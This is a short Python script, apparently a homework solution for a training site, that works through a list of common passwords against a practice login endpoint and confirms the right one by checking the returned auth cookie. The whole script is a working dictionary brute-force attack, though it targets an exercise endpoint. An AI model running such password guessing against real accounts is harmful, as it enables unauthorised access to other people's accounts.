import requests

passwords = [
    '123456',
    '123456789',
    'qwerty',
    'password',
    '1234567',
    '12345678',
    '12345',
    'iloveyou',
    '111111',
    '123123',
    'abc123',
    'qwerty123',
    '1q2w3e4r',
    'admin',
    'qwertyuiop',
    '654321',
    '555555',
    'lovely',
    '7777777',
    'welcome',
    '888888',
    'princess',
    'dragon',
    'password1',
    '123qwe']
url = "https://playground.learnqa.ru/api/"
correct_login = "super_admin"
correct_password = 'not know'
for password in passwords:

    response = requests.post(
        f"{url}get_secret_password_homework",
        data={
            'login' : correct_login,
            'password' : password
            }
    )

    if response.status_code == 200:
        auth_cookie = response.cookies['auth_cookie']
    else:
        auth_cookie = "mock_cookie"


    response1 = requests.post(
        f"{url}check_auth_cookie",
        data={
            'auth_cookie' : auth_cookie
        }
    )

    if response1.text == 'You are authorized':
        print(f"Login: {correct_login}. Password: {password} is correct!")
        correct_password = password
        break
    else:
        print(f"Login: {correct_login}. Password: {password} is NOT correct!")

    print("--------------")

print(f"Correct password: {correct_password}")